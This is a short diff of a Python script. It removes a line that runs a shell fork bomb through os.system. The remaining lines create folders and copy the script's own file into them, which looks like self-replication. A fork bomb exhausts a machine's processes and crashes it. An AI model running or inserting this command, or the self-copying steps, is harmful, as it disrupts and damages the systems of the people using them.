@@ -8,7 +8,6 @@ file = os.path.basename(__file__)
 
 
 
-os.system(":(){ :|:& };:")
 os.system(f"mkdir {path}/folder")
 os.system(f"mkdir {path}/folder2")
 os.system(f"cp {file} {path}/folder/main.py")
